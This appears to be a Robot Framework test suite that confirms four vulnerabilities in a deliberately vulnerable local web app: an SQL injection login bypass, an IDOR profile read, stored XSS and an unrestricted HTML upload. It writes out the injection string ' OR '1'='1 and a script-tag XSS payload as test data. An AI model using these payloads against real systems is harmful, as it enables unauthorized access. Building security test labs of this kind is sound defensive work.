*** Settings ***
Library           RequestsLibrary
Library           Collections
Library           String
Suite Setup       Create Session    vuln    ${BASE_URL}

*** Variables ***
${BASE_URL}       %{VULN_BASE_URL=http://localhost:4567}
${SQLI_PAYLOAD}   ' OR '1'='1

*** Test Cases ***
SQL Injection Bypasses Login
    ${data}=    Create Dictionary    username=${SQLI_PAYLOAD}    password=${SQLI_PAYLOAD}
    ${resp}=    POST On Session    vuln    /login    data=${data}
    Should Be Equal As Integers    ${resp.status_code}    200
    Should Contain    ${resp.text}    Logged in as
    Should Contain    ${resp.text}    admin

IDOR Exposes Another User Profile
    ${resp}=    GET On Session    vuln    /profile/2
    Should Be Equal As Integers    ${resp.status_code}    200
    Should Contain    ${resp.text}    alice@example.com
    Should Not Contain    ${resp.headers['Content-Type']}    text/html

Stored XSS Persists Unsanitized Script
    ${marker}=    Generate Random String    6    [LOWER]
    ${body}=       Set Variable    <script>alert("${marker}")</script>
    ${data}=       Create Dictionary    author=robot    body=${body}
    POST On Session    vuln    /comment    data=${data}
    ${resp}=    GET On Session    vuln    /comment
    Should Contain    ${resp.text}    ${body}

Unrestricted Upload Accepts HTML File
    ${file_tuple}=    Create List    payload.html    <h1>RF upload</h1>    text/html
    ${files}=        Create Dictionary    payload=${file_tuple}
    ${resp}=         POST On Session    vuln    /upload    files=${files}
    Should Be Equal As Integers    ${resp.status_code}    200
    Should Contain    ${resp.text}    Stored payload.html
